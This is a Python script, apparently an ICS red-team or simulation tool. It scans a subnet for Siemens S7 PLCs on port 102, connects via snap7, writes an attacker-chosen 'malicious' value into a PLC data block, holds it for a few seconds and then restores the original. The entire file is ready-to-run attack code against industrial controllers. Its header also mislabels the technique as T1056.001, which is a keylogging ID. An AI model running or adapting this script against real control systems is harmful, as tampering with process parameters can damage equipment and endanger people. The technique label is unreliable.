# MITRE ATT&CK T1056.001: Modify Parameter
# Simulate modifying a PLC parameter to cause an unexpected outcome.
# This script assumes the PLC is accessible via the network through the switch.

import snap7
import time
import socket
import struct

# Configuration - MODIFY THESE VALUES APPROPRIATELY
PLC_RACK = 0  # PLC Rack number
PLC_SLOT = 1  # PLC Slot number
DATA_BLOCK_NUMBER = 1  # Data Block to modify
PARAMETER_ADDRESS = 0  # Starting byte address of the parameter within the DB
PARAMETER_DATATYPE = 'REAL' # Data type of the parameter (e.g., 'INT', 'REAL', 'DINT')
ORIGINAL_VALUE = 10.0   # The original value of the parameter before modification
MODIFIED_VALUE = 100.0 # The malicious value to set for the parameter
WAIT_TIME = 5  # Time (seconds) to hold the modified value

# Function to discover the PLC's IP Address. This is a basic discovery and may need adaptation.
def discover_plc_ip(subnet="192.168.1"):
    """Attempts to discover the PLC IP address by pinging a range of addresses.
       This is a rudimentary method and might not be reliable in all environments.
       Adapt for your specific network setup and discovery needs."""
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        try:
            socket.inet_aton(ip)  # Validate IP address format
            # Simple ping (requires elevated privileges on some systems)
            # Adapt with a better ping library if needed
            response = os.system(f"ping -n 1 -w 100 {ip} > nul 2>&1") # Windows ping

            if response == 0: #Ping successful
                print(f"Possible PLC IP Address: {ip}")
                # Implement a better check here to confirm it's the PLC
                # For example, check if port 102 (S7 protocol) is open
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, 102))
                if result == 0:
                    print(f"Confirmed PLC IP Address: {ip}")
                    return ip
                sock.close()

        except socket.error:
            print(f"Invalid IP Address: {ip}")
            continue

    print("PLC IP Address discovery failed.  Please specify manually.")
    return None


# Function to read data from the PLC DB
def read_plc_data(plc, db_number, start_address, data_type, size):
    """Reads data from a specified Data Block (DB) in the PLC."""
    try:
        data = plc.db_read(db_number, start_address, size)

        if data_type == 'INT':
            value = struct.unpack_from(">h", data, 0)[0]
        elif data_type == 'REAL':
            value = struct.unpack_from(">f", data, 0)[0]
        elif data_type == 'DINT':
            value = struct.unpack_from(">i", data, 0)[0]
        else:
            print("Unsupported Data Type.  Returning raw bytes.")
            value = data  # Return raw bytes

        return value
    except Exception as e:
        print(f"Error reading data: {e}")
        return None


# Function to write data to the PLC DB
def write_plc_data(plc, db_number, start_address, data_type, value):
    """Writes data to a specified Data Block (DB) in the PLC."""
    try:
        if data_type == 'INT':
            data = struct.pack(">h", value)
        elif data_type == 'REAL':
            data = struct.pack(">f", value)
        elif data_type == 'DINT':
            data = struct.pack(">i", value)
        else:
            print("Unsupported Data Type.")
            return False

        plc.db_write(db_number, start_address, data)
        return True
    except Exception as e:
        print(f"Error writing data: {e}")
        return False



# Main Execution
if __name__ == "__main__":

    # Discover PLC IP
    import os  # Needed for ping
    plc_ip_address = discover_plc_ip()

    if not plc_ip_address:
       plc_ip_address = input("Enter PLC IP Address manually: ") #Prompt for manual input

    try:
        # 1. Connect to the PLC
        plc = snap7.client.Client()
        plc.connect(plc_ip_address, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {plc_ip_address}")


        # 2. Read the original value of the parameter
        original_read_value = read_plc_data(plc, DATA_BLOCK_NUMBER, PARAMETER_ADDRESS, PARAMETER_DATATYPE, 4) # Assuming 4 bytes for REAL/INT. Adjust if needed.

        print(f"Original parameter value: {original_read_value}")

        # 3. Modify the parameter
        print(f"Modifying parameter in DB{DATA_BLOCK_NUMBER} at address {PARAMETER_ADDRESS} to {MODIFIED_VALUE}")
        if write_plc_data(plc, DATA_BLOCK_NUMBER, PARAMETER_ADDRESS, PARAMETER_DATATYPE, MODIFIED_VALUE):
            print("Parameter modification successful.")
        else:
            print("Parameter modification failed.")
            plc.disconnect()
            exit()

        # 4. Wait for a period of time (to simulate impact of modified parameter)
        print(f"Waiting for {WAIT_TIME} seconds...")
        time.sleep(WAIT_TIME)


        # 5. Restore the original parameter value
        print(f"Restoring parameter in DB{DATA_BLOCK_NUMBER} at address {PARAMETER_ADDRESS} to {ORIGINAL_VALUE}")
        if write_plc_data(plc, DATA_BLOCK_NUMBER, PARAMETER_ADDRESS, PARAMETER_DATATYPE, ORIGINAL_VALUE):
            print("Parameter restoration successful.")
        else:
            print("Parameter restoration failed.")


    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # 6. Disconnect from the PLC
        if 'plc' in locals() and plc.get_connected(): #Check if plc object exists and is connected.
            plc.disconnect()
            print("Disconnected from PLC.")


print("Script finished.")